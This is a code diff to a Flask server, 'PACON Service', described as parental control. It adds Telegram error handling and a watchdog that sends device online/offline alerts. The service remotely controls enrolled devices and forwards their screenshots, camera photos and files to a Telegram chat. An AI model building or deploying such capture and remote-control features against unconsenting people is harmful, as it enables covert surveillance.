@@ -2,12 +2,14 @@
 # -*- coding: utf-8 -*-
 
 """
-PACON Service - v1.0
+PACON Service - v1.1
 + 6-digit PIN authentication (parent dashboard)
 + Agent PIN authentication (agents → server)
 + Session cookies + rate limiting
 + Full remote control (tap/swipe/scroll/hotkeys/launch)
-+ Telegram integration: send screenshots, camera photos, files, apps list, text
++ Telegram integration with proper error messages
++ Online/Offline Telegram notifications via watchdog
++ Better app-launch path handling
 """
 
 import os
@@ -77,7 +79,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(
 logger = logging.getLogger(__name__)
 
 # ============================================================
-# AUTH CONFIG — 6-digit PINs from environment
+# AUTH CONFIG
 # ============================================================
 
 PARENT_PIN = os.environ.get('PARENT_PIN', '').strip()
@@ -95,12 +97,10 @@ elif not AGENT_PIN.isdigit() or len(AGENT_PIN) != 6:
     logger.error("❌ AGENT_PIN must be exactly 6 digits")
     AGENT_PIN = ""
 
-# Session storage
 sessions = {}
 SESSION_TTL = 24 * 3600
 SESSION_COOKIE = "pacon_session"
 
-# Login rate limiting
 login_attempts = defaultdict(list)
 MAX_LOGIN_ATTEMPTS = 5
 LOGIN_WINDOW = 300
@@ -136,6 +136,9 @@ device_screens = {}
 command_queues = defaultdict(deque)
 command_results = {}
 control_devices = {}
+
+# ✅ Track online/offline state per device for notifications
+device_online_state = {}   # device_id -> bool
 
 ping_thread = None
 ping_running = False
@@ -291,7 +294,7 @@ def ping_server():
     while ping_running:
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.0')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.1')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     logger.debug(f"✅ Self-ping OK: {url}")
@@ -318,6 +321,8 @@ telegram_config = {
     "bot_token": "",
     "chat_id": "",
     "enabled": False,
+    "notify_online": True,    # ✅ notify when device comes online
+    "notify_offline": True,   # ✅ notify when device goes offline
 }
 
 def _load_telegram_config():
@@ -344,8 +349,14 @@ def _telegram_api_url(method: str) -> str:
     return f"https://api.telegram.org/bot{telegram_config['bot_token']}/{method}"
 
 def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
-    if not telegram_config.get("enabled") or not telegram_config.get("bot_token") or not telegram_config.get("chat_id"):
-        return {"success": False, "error": "Telegram not configured"}
+    """Send text message. Returns full Telegram error details on failure."""
+    if not telegram_config.get("enabled"):
+        return {"success": False, "error": "Telegram is disabled"}
+    if not telegram_config.get("bot_token"):
+        return {"success": False, "error": "Bot token is empty"}
+    if not telegram_config.get("chat_id"):
+        return {"success": False, "error": "Chat ID is empty"}
+
     try:
         import urllib.parse
         url = _telegram_api_url("sendMessage")
@@ -359,12 +370,21 @@ def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
         req.add_header("Content-Type", "application/x-www-form-urlencoded")
         with urllib.request.urlopen(req, timeout=30) as r:
             body = json.loads(r.read().decode("utf-8"))
-            return {"success": bool(body.get("ok")), "result": body}
+            if body.get("ok"):
+                return {"success": True, "result": body}
+            err_desc = body.get("description", "unknown error")
+            logger.error(f"Telegram sendMessage failed: {err_desc}")
+            return {"success": False, "error": err_desc, "result": body}
     except urllib.error.HTTPError as he:
         try:
             err_body = he.read().decode("utf-8")
-            logger.error(f"Telegram sendMessage HTTP {he.code}: {err_body[:300]}")
-            return {"success": False, "error": f"HTTP {he.code}", "details": err_body[:300]}
+            try:
+                err_json = json.loads(err_body)
+                err_desc = err_json.get("description", err_body[:200])
+            except Exception:
+                err_desc = err_body[:200]
+            logger.error(f"Telegram sendMessage HTTP {he.code}: {err_desc}")
+            return {"success": False, "error": f"HTTP {he.code}: {err_desc}"}
         except Exception:
             return {"success": False, "error": f"HTTP {he.code}"}
     except Exception as e:
@@ -372,10 +392,22 @@ def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
         return {"success": False, "error": str(e)}
 
 def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "") -> dict:
-    if not telegram_config.get("enabled") or not telegram_config.get("bot_token") or not telegram_config.get("chat_id"):
-        return {"success": False, "error": "Telegram not configured"}
+    """Upload file to Telegram. Returns full error details."""
+    if not telegram_config.get("enabled"):
+        return {"success": False, "error": "Telegram is disabled"}
+    if not telegram_config.get("bot_token"):
+        return {"success": False, "error": "Bot token is empty"}
+    if not telegram_config.get("chat_id"):
+        return {"success": False, "error": "Chat ID is empty"}
     if not filepath.exists():
-        return {"success": False, "error": "File not found"}
+        return {"success": False, "error": f"File not found: {filepath.name}"}
+
+    file_size = filepath.stat().st_size
+    if file_size == 0:
+        return {"success": False, "error": "File is empty (0 bytes)"}
+    if field == "photo" and file_size > 10 * 1024 * 1024:
+        logger.warning(f"Photo too big ({file_size // 1024}KB) — sending as document")
+        return _telegram_upload("sendDocument", "document", filepath, caption)
 
     try:
         import mimetypes
@@ -410,12 +442,21 @@ def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "
 
         with urllib.request.urlopen(req, timeout=120) as r:
             resp = json.loads(r.read().decode("utf-8"))
-            return {"success": bool(resp.get("ok")), "result": resp}
+            if resp.get("ok"):
+                return {"success": True, "result": resp}
+            err_desc = resp.get("description", "unknown error")
+            logger.error(f"Telegram {endpoint} failed: {err_desc}")
+            return {"success": False, "error": err_desc, "result": resp}
     except urllib.error.HTTPError as he:
         try:
             err_body = he.read().decode("utf-8")
-            logger.error(f"Telegram {endpoint} HTTP {he.code}: {err_body[:300]}")
-            return {"success": False, "error": f"HTTP {he.code}", "details": err_body[:300]}
+            try:
+                err_json = json.loads(err_body)
+                err_desc = err_json.get("description", err_body[:200])
+            except Exception:
+                err_desc = err_body[:200]
+            logger.error(f"Telegram {endpoint} HTTP {he.code}: {err_desc}")
+            return {"success": False, "error": f"HTTP {he.code}: {err_desc}"}
         except Exception:
             return {"success": False, "error": f"HTTP {he.code}"}
     except Exception as e:
@@ -427,6 +468,66 @@ def _telegram_send_photo(filepath: Path, caption: str = "") -> dict:
 
 def _telegram_send_document(filepath: Path, caption: str = "") -> dict:
     return _telegram_upload("sendDocument", "document", filepath, caption)
+
+# ============================================================
+# ✅ ONLINE / OFFLINE NOTIFICATIONS
+# ============================================================
+
+def _notify_state_change(device_id: str, is_online: bool):
+    """Send Telegram notification when device state changes."""
+    info = devices.get(device_id, {})
+    name = info.get('name', 'Unknown')
+    model = info.get('model', 'Unknown')
+
+    if is_online and telegram_config.get("notify_online", True):
+        _telegram_send_message(
+            f"🟢 <b>Device Online</b>\n"
+            f"👤 {name}\n"
+            f"💻 {model}\n"
+            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        logger.info(f"📲 Sent ONLINE notification for {device_id[:8]}")
+    elif (not is_online) and telegram_config.get("notify_offline", True):
+        _telegram_send_message(
+            f"🔴 <b>Device Offline</b>\n"
+            f"👤 {name}\n"
+            f"💻 {model}\n"
+            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        )
+        logger.info(f"📲 Sent OFFLINE notification for {device_id[:8]}")
+
+def _mark_device_online(device_id: str):
+    """Called when device polls or registers. Sends notification if state changed."""
+    was_online = device_online_state.get(device_id)
+    device_online_state[device_id] = True
+    if was_online is False or was_online is None:
+        if was_online is False:  # only notify on transition, not first-seen
+            _notify_state_change(device_id, True)
+
+def _device_watchdog():
+    """Background thread: detects when devices go offline and notifies."""
+    while True:
+        try:
+            time.sleep(10)  # check every 10 seconds
+            now = time.time()
+            for device_id in list(device_online_state.keys()):
+                last_poll = control_devices.get(device_id, 0)
+                is_online = (now - last_poll) < 15
+                was_online = device_online_state.get(device_id)
+
+                if was_online and not is_online:
+                    device_online_state[device_id] = False
+                    _notify_state_change(device_id, False)
+        except Exception as e:
+            logger.debug(f"Watchdog error: {e}")
+
+_watchdog_thread = None
+def start_watchdog():
+    global _watchdog_thread
+    if _watchdog_thread is None or not _watchdog_thread.is_alive():
+        _watchdog_thread = threading.Thread(target=_device_watchdog, daemon=True)
+        _watchdog_thread.start()
+        logger.info("👁️ Device watchdog started")
 
 # ============================================================
 # AUTH ENDPOINTS
@@ -527,7 +628,7 @@ def serve_static(path):
 
 def get_fallback_html():
     return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ PACON v1.0</h1>
+    <h1>🛡️ PACON v1.1</h1>
     <p>index.html not found. Please upload it to web/public/</p>
     </body></html>'''
 
@@ -543,7 +644,7 @@ def health_check():
         "success": True,
         "service": "PACON API",
         "status": "running",
-        "version": "1.0.0",
+        "version": "1.1.0",
         "platform": platform.system(),
         "devices": len(devices),
         "online_agents": online_agents,
@@ -846,6 +947,10 @@ def monitor_user():
         }
         add_activity('user_registered', f"{data.get('name','User')} from {data.get('deviceModel','Unknown')}", device_id)
         logger.info(f"✅ User registered: {data.get('name')} ({data.get('deviceModel')})")
+
+        # ✅ Mark device online (fires notification if state changed)
+        _mark_device_online(device_id)
+
         return jsonify({"success": True, "device_id": device_id})
     except Exception as e:
         logger.error(f"User error: {e}")
@@ -1023,6 +1128,10 @@ def control_poll():
         return '', 204
     device_id = request.args.get('deviceId', 'unknown')
     control_devices[device_id] = time.time()
+
+    # ✅ Mark online (fires notification if transition)
+    _mark_device_online(device_id)
+
     now = time.time()
     q = command_queues[device_id]
     fresh = deque(item for item in q if now - item['created'] <= item['ttl'])
@@ -1199,6 +1308,8 @@ def telegram_status():
         "success": True,
         "enabled": telegram_config.get("enabled", False),
         "configured": bool(telegram_config.get("bot_token") and telegram_config.get("chat_id")),
+        "notify_online": telegram_config.get("notify_online", True),
+        "notify_offline": telegram_config.get("notify_offline", True),
     })
 
 @app.route('/api/telegram/config', methods=['GET', 'POST'])
@@ -1212,6 +1323,8 @@ def telegram_config_endpoint():
                 'bot_token': telegram_config.get('bot_token', ''),
                 'chat_id':   telegram_config.get('chat_id', ''),
                 'enabled':   telegram_config.get('enabled', False),
+                'notify_online':  telegram_config.get('notify_online', True),
+                'notify_offline': telegram_config.get('notify_offline', True),
             }
         })
     data = request.json or {}
@@ -1221,6 +1334,10 @@ def telegram_config_endpoint():
         telegram_config['chat_id'] = str(data['chat_id']).strip()
     if 'enabled' in data:
         telegram_config['enabled'] = bool(data['enabled'])
+    if 'notify_online' in data:
+        telegram_config['notify_online'] = bool(data['notify_online'])
+    if 'notify_offline' in data:
+        telegram_config['notify_offline'] = bool(data['notify_offline'])
     _save_telegram_config()
     logger.info(f"📲 Telegram config updated (enabled={telegram_config['enabled']})")
     return jsonify({'success': True})
@@ -1252,7 +1369,7 @@ def telegram_send_screenshot(filename):
             r = _telegram_send_photo(filepath, caption)
             add_activity('telegram', f'Sent screenshot {filename}', device_id)
             return jsonify(r)
-    return jsonify({'success': False, 'error': 'File not found'}), 404
+    return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
 
 @app.route('/api/telegram/send-camera/<filename>', methods=['POST'])
 @require_parent_auth
@@ -1266,7 +1383,7 @@ def telegram_send_camera(filename):
             r = _telegram_send_photo(filepath, caption)
             add_activity('telegram', f'Sent camera photo {filename}')
             return jsonify(r)
-    return jsonify({'success': False, 'error': 'File not found'}), 404
+    return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
 
 @app.route('/api/telegram/send-file/<filename>', methods=['POST'])
 @require_parent_auth
@@ -1280,7 +1397,7 @@ def telegram_send_file(filename):
             r = _telegram_send_document(filepath, caption)
             add_activity('telegram', f'Sent file {filename}')
             return jsonify(r)
-    return jsonify({'success': False, 'error': 'File not found'}), 404
+    return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
 
 @app.route('/api/telegram/send-apps', methods=['POST'])
 @require_parent_auth
@@ -1342,7 +1459,7 @@ def handle_exception(e):
 
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.0 - PIN + TELEGRAM")
+    print("  PACON SERVICE v1.1 - PIN + TELEGRAM + WATCHDOG")
     print("=" * 70)
     logger.info(f"Web dir: {WEB_DIR}")
     logger.info(f"Running on Render: {IS_RENDER}")
@@ -1351,6 +1468,8 @@ def main():
     logger.info(f"Telegram:   {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")
 
     start_ping_system()
+    start_watchdog()
+
     app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
 
 if __name__ == '__main__':
